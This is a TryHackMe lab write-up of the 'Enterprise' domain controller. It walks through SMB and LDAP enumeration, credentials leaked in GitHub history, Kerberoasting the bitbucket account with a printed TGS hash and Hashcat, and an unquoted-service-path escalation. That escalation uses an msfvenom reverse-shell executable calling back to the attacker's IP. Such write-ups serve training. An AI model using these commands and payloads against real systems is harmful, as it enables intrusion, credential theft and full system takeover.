| **Machine**             | \[Enterprise]                                                                                                                  |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **Platform**            | TryHackMe                                                                                                                   |
| **Difficulty**          | Hard                                                                                                                      |
| **Key Concepts**        | `SMB Enumeration, Public GitHub Recon, LDAP Enumeration, Kerberoasting, Cracking with Hashcat, Unquoted Service Path Exploitation` |


# Enumeration
Running Nmap, it looks like we’re dealing with a Domain Controller, plenty of standard AD ports are open.
```bash
Not shown: 65387 closed tcp ports (reset), 120 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION                                                                                                  
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0           
| http-methods:                                    
|   Supported Methods: OPTIONS TRACE GET HEAD POST 
|_  Potentially risky methods: TRACE               
|_http-title: Site doesn't have a title (text/html).             
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-08 15:15:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?                      
464/tcp   open  kpasswd5?                                                                                                              
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Issuer: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Public Key type: rsa       
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-07T15:10:59
| Not valid after:  2026-02-06T15:10:59
| MD5:   56d8:c08a:dcde:f00d:7013:e6ac:674a:1f01
|_SHA-1: 657b:85ac:f851:60b7:8712:21ae:f48a:6d4e:176d:6cc5
|_ssl-date: 2025-08-08T15:16:46+00:00; +7s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-08T15:16:38+00:00
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7990/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Log in to continue - Log in with Atlassian account
| http-methods:|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7s, deviation: 0s, median: 6s
| smb2-time: 
|   date: 2025-08-08T15:16:39
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.09 seconds
```
I will start by generating the hosts file using NetExec:
```bash
nxc smb 10.10.33.43 -u '' -p '' --generate-hosts-file hosts
```
Enumerating shares as guest, I see a non standard shares Users and Docs that are readable:
```bash
└─$ nxc smb 10.10.33.43 -u 'guest' -p '' --shares
SMB         10.10.33.43     445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False) 
SMB         10.10.33.43     445    LAB-DC           [+] LAB.ENTERPRISE.THM\guest: 
SMB         10.10.33.43     445    LAB-DC           [*] Enumerated shares
SMB         10.10.33.43     445    LAB-DC           Share           Permissions     Remark
SMB         10.10.33.43     445    LAB-DC           -----           -----------     ------
SMB         10.10.33.43     445    LAB-DC           ADMIN$                          Remote Admin
SMB         10.10.33.43     445    LAB-DC           C$                              Default share
SMB         10.10.33.43     445    LAB-DC           Docs            READ            
SMB         10.10.33.43     445    LAB-DC           IPC$            READ            Remote IPC
SMB         10.10.33.43     445    LAB-DC           NETLOGON                        Logon server share 
SMB         10.10.33.43     445    LAB-DC           SYSVOL                          Logon server share 
SMB         10.10.33.43     445    LAB-DC           Users           READ            Users Share. Do Not Touch!

```
Using netexec with --rid-brute reveals a list of domain accounts (could be useful later)
Connection to users share with smbclient, I find a ConsoleHost_history.txt containing creds — but they don’t work anywhere.
Checking the Docs share, I find two files:

```bash
smb: \> ls
  .                                   D        0  Sun Mar 14 22:47:35 2021
  ..                                  D        0  Sun Mar 14 22:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Sun Mar 14 22:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Sun Mar 14 22:45:24 2021
```
Both are password-protected. I dump hashes with office2john but can’t crack them.
<img width="777" height="261" alt="2025-08-08 185538" src="https://github.com/user-attachments/assets/ba779882-7691-4abf-b778-cd2dd40510b4" />

# Web Enumeration
Port 7990 (Atlassian) doesn’t have any juicy open directories from fuzzing. But a note says:
“Reminder to all Enterprise-THM Employees: We are moving to Github!”
Googling GitHub for Enterprise-THM, I find a public repo. Enumerating commit history, I spot an earlier commit by nik-enterprise-dev that contains cleartext credentials.
<img width="1438" height="471" alt="2025-08-08 192725" src="https://github.com/user-attachments/assets/ad1964e0-6a23-4c8c-91b8-5706e9bdebce" />

Testing with NetExec confirms the creds work for nik:
```bash
└─$ nxc ldap 10.10.148.165 -u nik -p 'ToastyBoi!'
SMB         10.10.148.165   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False) 
SMB         10.10.148.165   445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! 
```
Now with LDAP access, we can enumerate much more, I enumerate user descriptions and spot password for user contractor-temp
<img width="2250" height="352" alt="2025-08-08 194322" src="https://github.com/user-attachments/assets/998a7680-f7ca-4ad4-be2e-bd94885a52d6" />

After doing more enumeration, i found that we can kerberoast the bitbucket account.

```bash
└─$ impacket-GetUserSPNs LAB.ENTERPRISE.THM/contractor-temp:Password123! -request 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$fbc3d3182519fc7c3bcaf7aa6b1539e2$12b85f8fa8a54b223df555190926fcc83e3c287e971873cbfa15060d80976c9762db546b483a065d25d8643fffe75b5a56fccb930af73d29f003f60b5b82036de070c82e2ec032061caee55941c8ae84951c6c60143f42da27b5b4434f215b7ebc56af017dfd3637f2e9828160ba6dc58d7d586e468881f84a477ed2f3954666a3f35cfac9916ee38d65d11411cc6f383bef47df8d0b2704edfa598edfa89e8f2a88dcbf584259d7e7925009b8731cb063192baa637b0874f7a5266c92f372eec088e4bf5130c6e77b41dce0ea7aa18f0c3ef80b6fe7e12d0f8fec19ad9aa6fcf0fe8ad713c2a37b9504043252b4480e876ecf546f613158f3511931c187a52105c4889ad394b5d7725866a1de7c735f49d70c8cb1cd590ca05a837f6bb596734fc80bd92a664a6948d6b9f94a9fd2a4ffb91d69aee7ff3a00cc9042e5f52e7f2e7dac3f75fe23cfa9465f09b6bbcb8f3e5baf99472e76f9903a295fe77f2870dd56b8e5371719fee54f53b986a9fd0497e1e9c81935a8ce4ac355b74fecbb32f5e1be557c8d5cc90cc131b81b6956f0a5ffaa312d479cd741e7535e00ee805476ccfd7dab476b89f01c80dbb83759aeea6922ffac773195a1de2742b557cf0e674f337681f88e84621768e05dc7780ff23c68ab9ad4b6a08760ae99d1548de7f51575ed2ec5d5aa1d48ffe06fecc65d1831601e9212e0f7be4ce978b4ecae5ccdccf43890b715199f20468a258d59d827a335b24a657d2efdfd9fa75dd9730c151ca4e8520a82da0f18a33740e0b55c0cc8ae1c5a9e9adf54de475873ee927273b1abb848ad43341c207fcc31b040df9ecf54aad5850ae1d6a785ccfe8665386543041638b4ef7cc26a8a6ebe75a326aa1a57e3a95ba52c99f397e2734e6f8145a751ab0a73d59b74028b46d528e61723fa223cc4351444408e2a55ef25fd1f85285af3165bf9a495e2a4495d39930c19d3306f2bdccd516e63a067929b01ed97720f85451a1fe8a2613b37f97792f6da85047117ee75b52083561e142a9ed343ca0fed13b3cb44ecc2dbaeca62b2df12c2fdcdac03406a85ae5c6471213f2a6f3429b2625e01a856df9f6f80805a738871c76f97ccc41cc7c8327b5c70fe702448352fd6a2e9ad5c6afce04c3bab3e89fad7243e50fb4967526bc36b0de705d59b82bfa50cee2d7ba3276981e65f1057a04d30c8ffa40e975464415ec82934d2735e9f0436e5e545cc385a3b02df00de34f07809168b21ee2236fd85934fe9f80e191ea5cf33188d8c23b46f66978ccc2cb96f37a7da01e36798d81c01054e1880bb4cc951315ea7aca282342dbf114afcf9867d0c846c4a62ff5225aa612029e0681b35e1806fd8f48191b2e461534072865f6b6e1b757f7ab37ecb7c29f9c4d3bf2898f286d5771c6f9919cd099d4b8c42e88c4e42bda466e3c03511ba68b7a55b9057281347c0b64fba38c84eccf5a41751914e65ae728bbba90485898d3f4617bbd1166c9adb96851ffd5b96
```
I grab the TGS hash for bitbucket and crack it with Hashcat.

<img width="3426" height="1065" alt="2025-08-08 194835" src="https://github.com/user-attachments/assets/0efc110e-6308-4875-b539-4784c0062fd3" />


# Privilege escalationb
I run BloodHound to look for attack paths to DA but nothing promising. Time to drop WinPEAS.
WinPEAS flags an Unquoted Service Path

<img width="1383" height="507" alt="2025-08-08 200137" src="https://github.com/user-attachments/assets/28d08ff2-2fc9-4ed7-883f-5967581471be" />

> Why this works?
> Windows will search for executables in the unquoted path **in order**, stopping at spaces.
> `C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe`
> Windows will try:
> C:\Program.exe
   C:\Program Files (x86)\Zero.exe
   C:\Program Files (x86)\Zero Tier\Zero.exe

Because Windows parses unquoted paths with spaces from left to right, I can plant a malicious Zero.exe in `C:\Program Files (x86)\Zero Tier\`
If the service runs as LocalSystem, my payload executes with SYSTEM privileges
On Kali, I craft a payload:
```bash
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.1.208 LPORT=9001 -f exe -o Zero.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: Zero.exe

```
I upload it to the victim in the target folder

<img width="1250" height="205" alt="2025-08-08 200854" src="https://github.com/user-attachments/assets/bf374ef7-7bee-48aa-899c-275b7ef22832" />

start my listener, and restart the service with net start / net stop...

<img width="1146" height="402" alt="2025-08-08 202618" src="https://github.com/user-attachments/assets/0284bd4b-5eb6-4c30-a512-100812a2ce8a" />

So now i get a SYSTEM shell and grab root.txt.
 

